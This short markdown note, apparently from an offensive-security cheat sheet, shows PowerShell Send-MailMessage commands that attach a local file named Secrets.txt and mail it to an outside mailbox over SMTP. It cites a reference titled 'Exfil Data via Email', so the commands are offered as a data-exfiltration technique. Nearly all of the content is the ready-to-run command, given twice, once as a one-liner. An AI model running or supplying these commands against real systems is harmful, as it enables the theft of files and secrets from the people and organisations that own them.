# SMTP

## 01 - Powershell

### 1.1 - Send-MailMessage

```powershell
PS C:\> $username = 'bob@mail.ru'
$password = ConvertTo-SecureString -String "<password>" -AsPlainText -Force
$credentials = New-Object -TypeName  System.Management.Automation.PSCredential -ArgumentList $username, $password
Send-MailMessage -From 'Bob <bob.baronov@mail.ru>' -To 'Alice <alice@mail.ru>' -Subject 'From powershell' -Body 'See  attachments.' -Attachments 'C:\Tools\files\Secrets.txt' -SmtpServer 'box.mail.ru' -Credential $credentials
```

Here's an example

```powershell
PS C:\> $username = 'alice@mail.ru'; $password = ConvertTo-SecureString -String "<password>" -AsPlainText -Force; $credentials = New-Object -TypeName  System.Management.Automation.PSCredential -ArgumentList $username, $password;  Send-MailMessage -From 'bob <bob@mail.ru>' -To 'Alice  <alice@mail.ru>' -Subject 'From powershell' -Body 'See  attachments.' -Attachments 'C:\Tools\files\Secrets.txt' -SmtpServer 'box.mail.ru' -Credential $credentials
```

## References

- [Exfil Data via Email](https://docs.anarchy-farm.com/exfil-data-via-e-mail)